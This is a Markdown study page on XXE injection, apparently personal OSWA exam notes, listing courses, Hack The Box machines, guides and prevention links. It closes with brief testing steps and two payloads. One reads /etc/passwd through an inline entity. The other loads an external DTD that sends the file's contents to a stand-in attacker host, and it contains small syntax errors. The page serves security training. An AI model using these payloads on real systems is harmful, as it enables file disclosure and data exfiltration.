![image](https://github.com/user-attachments/assets/2001f1cc-0a7a-4871-a657-e3d483ceb030)

# XXE - XML External Entities

## Training Resources
---

**Courses**

*Free*

- [PortSwigger Academy - XXE](https://portswigger.net/web-security/xxe)

*Paid*
- [HTB - Web Attacks (XXE Subsection)](https://academy.hackthebox.com/course/preview/web-attacks)
- [HTB - Web Services & API Attacks (XXE Subsection)](https://academy.hackthebox.com/course/preview/web-service--api-attacks)
- [THM - XXE Injection](https://tryhackme.com/r/room/xxeinjection)

#

### Hack The Box Machines
*These machines are tagged as containing XXE by HTB, the difficulty refers to the box as a whole and not necessarily the XXE element.*

| Machine Name | Difficulty | Completed |
| -- | -- | -- |
| BountyHunter | Easy | |
| RedPanda | Easy | |
| NodeBlog | Easy | |
| MetaTwo | Easy | |
| Label | Easy | |
| DevOps | Medium | |
| Clicker | Medium | |
| Aragog | Medium | |
| Pollution | Hard | |
| Patents | Hard | |
| RE | Hard | |
| ForwardSlash | Hard | |
| Spider | Hard | |
| Helpline | Hard | |
| Fulcrum | Insane | |

### Other Resources
---
**PT Guides**
- [PwnFunction YouTube XXE Explained](https://www.youtube.com/watch?v=gjm6VHZa_8s)
- [Hacker Recipes - XXE Injection](https://www.thehacker.recipes/web/inputs/xxe-injection/#xxe-injection)
- [OWASP - XML External Entity (XXE) Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [HackTricks - XXE & XEE](https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html)
#
**Methodologies**
- [SWAP Methodology - XXE Injection](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection)
#
**XXE Prevention**
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
#
**Other**
- [YouTube - Stok Blind XXS Out-of-Bounds over DNS using PDF](https://www.youtube.com/watch?v=aSiIHKeN3ys)


## Condensed Notes
This is a condensed version of the notes I used during OSWA and are by no means complete. Make your own notes and methodology, building off these basic steps. 

- Look for evidence the application handles XML input.
- If there is a sample XML document to download, do it and get familiar with the format the application expects.
- Identify what fields from the XML are displayed to the page, this makes it easier to inject. If this can't be done, attempt to inject into every field. 
- Use Burp Suite HTTP history to look for any references to XML.
- Manipulate the XML in line to include your injection attempt in the XML and print response to screen:
```bash
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname SYSTEM "file:///etc/passwd">
]>
<Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</Contact>
```
- Alternatively try and replace the Document Type Definition (DTD) to use an external DTD hosted on your attack machine, example below shows this process and attempts to get the contents of the /etc/passwd file. 
```bash
# evil.dtd
<!ENTITY % passwd SYSTEM "file:///etc/passwd/">
<!ENTITY % wrapper "<!ENTITY send SYSTEM 'http://attacker-server.com/?%passwd;'>">
%wrapper;

# main.xml
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM @http://attacker.com/evil.dtd">
<pwn>&send;</pwn>
```
